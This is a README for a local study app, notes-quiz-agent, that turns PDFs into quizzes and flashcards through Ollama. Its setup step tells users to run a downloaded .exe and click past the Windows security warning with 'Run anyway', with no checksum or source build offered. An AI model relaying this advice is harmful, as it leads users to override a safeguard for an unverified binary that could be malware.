# 🧠 notes-quiz-agent - Turn your study notes into tests

[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Wry-letters233/notes-quiz-agent/releases)

notes-quiz-agent turns your PDF documents into a private study environment. It reads your course materials and creates flashcards, quizzes, and mock exams. The application runs on your computer. Your files stay on your machine. You do not need an internet connection to use these tools.

## 🛠 System requirements

This software uses local processing power to handle your documents. Your computer needs the following specifications to run it well:

* Windows 10 or Windows 11.
* At least 8GB of RAM.
* A solid-state drive (SSD) with 2GB of available space.
* An active installation of Ollama. Please download and install Ollama from [ollama.com](https://ollama.com) before you launch the notes-quiz-agent for the first time.

## 🚀 Getting set up

Once you have installed Ollama, follow these steps to start the application:

1. Open the downloaded `.exe` file. If Windows shows a security prompt, click "More info" and then "Run anyway."
2. The application will open in a new window.
3. On the first launch, the app connects to your local Ollama instance.
4. Select the "Settings" tab to verify the path to your data folder.
5. You are ready to upload your first PDF.

## 📚 Features

The notes-quiz-agent includes tools to streamline your study sessions.

**Document Analysis**
Upload any PDF file such as textbooks, lecture slides, or handwritten notes. The app processes the text and stores it in a secure, local database. 

**Smart Quizzes**
The software generates adaptive quizzes based on your uploaded material. These tests focus on areas where you struggle. If you miss a question, the agent provides a detailed explanation based on the source text.

**Spaced Repetition**
The system creates digital flashcards that follow a schedule. It prompts you to review information at intervals to help you store facts in your long-term memory.

**Mock Exams**
Generate timed practice tests to simulate real exam environments. You can set the number of questions, the difficulty level, and the time limit.

**Summaries**
Need a quick recap? Ask the agent to summarize a specific chapter or document. It creates concise notes across all your uploaded files.

## 🔒 Privacy and safety

This software processes all data on your local machine. No information leaves your computer. Your study habits and notes remain private. Because the app works offline, unauthorized users cannot access your documents through the internet.

## ❓ Frequently asked questions

**Do I need an internet connection to study?**
No. Once you install the application and Ollama, you can disconnect your computer from the web. The app runs completely offline.

**Does this app cost money?**
No. This tool is free to use. There are no subscriptions, hidden fees, or premium versions.

**Can I upload multiple PDFs?**
Yes. You can organize your study materials by topic. The app searches across all uploaded files to find the information you need.

**What if the app runs slowly?**
Check your computer's RAM usage. You should close other memory-intensive applications like web browsers while you generate tests. Ensure that your laptop power settings are set to "High Performance."

**How do I update the software?**
When a new version becomes available, revisit the main release page, download the new `.exe` file, and run it. The installer will overwrite the old version while keeping your existing database and study files intact.
